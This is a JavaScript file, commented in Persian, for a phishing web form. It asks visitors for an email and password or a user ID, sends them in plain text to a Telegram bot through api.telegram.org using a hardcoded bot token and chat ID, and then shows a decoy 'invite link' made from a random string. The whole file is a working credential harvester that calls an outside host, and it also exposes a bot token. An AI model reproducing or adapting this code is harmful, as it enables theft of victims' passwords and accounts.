// تابع برای تغییر ورودی‌ها بر اساس انتخاب کاربر
document.getElementById('method').addEventListener('change', function() {
    const method = this.value;
    const emailFields = document.getElementById('emailFields');
    const idFields = document.getElementById('idFields');

    // مخفی کردن تمامی فیلدها در ابتدا
    emailFields.classList.add('hidden');
    idFields.classList.add('hidden');

    // نمایش فیلدها بر اساس انتخاب
    if (method === 'email') {
        emailFields.classList.remove('hidden');
    } else if (method === 'id') {
        idFields.classList.remove('hidden');
    }
});

// تابع ارسال فرم
document.getElementById('requestForm').addEventListener('submit', function(event) {
    event.preventDefault(); // جلوگیری از رفرش شدن صفحه

    const method = document.getElementById('method').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const userId = document.getElementById('userId').value;

    // بررسی اینکه حداقل یکی از فیلدها پر شده باشد
    if (method === 'email' && (!email || !password)) {
        alert('لطفاً ایمیل و پسورد را وارد کنید!');
        return;
    } else if (method === 'id' && !userId) {
        alert('لطفاً یو آیدی را وارد کنید!');
        return;
    }

    // ارسال داده‌ها به ربات تلگرام
    sendDataToTelegram(email, password, userId);

    // نمایش پیام بعد از ارسال
    document.getElementById('message').classList.remove('hidden');
});

// تابع برای ارسال اطلاعات به ربات تلگرام
function sendDataToTelegram(email, password, userId) {
    const telegramToken = '7894209044:AAEyECspB4WCtzkFUwAN5WIKfA8Eq4OTwAY';  // توکن ربات تلگرام خود را وارد کنید
    const chatId = '7844081686'; // شناسه چت خود را وارد کنید

    const message = `اطلاعات کاربر:
    ایمیل: ${email || 'N/A'}
    پسورد: ${password || 'N/A'}
    یو آیدی: ${userId || 'N/A'}`;

    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // ارسال درخواست به ربات تلگرام
    fetch(url)
        .then(response => response.json())
        .then(data => {
            console.log('پیام به تلگرام ارسال شد:', data);
        })
        .catch(error => {
            console.error('خطا در ارسال پیام:', error);
        });
}

// تابع برای تولید لینک دعوت
document.getElementById('getLinkButton').addEventListener('click', function() {
    // لینک دعوت اختصاصی برای هر کاربر
    const inviteLink = `https://your-website.com/invite?ref=${Math.random().toString(36).substring(2)}`;
    document.getElementById('inviteLink').value = inviteLink;

    // نمایش لینک دعوت
    document.getElementById('linkContainer').classList.remove('hidden');
});
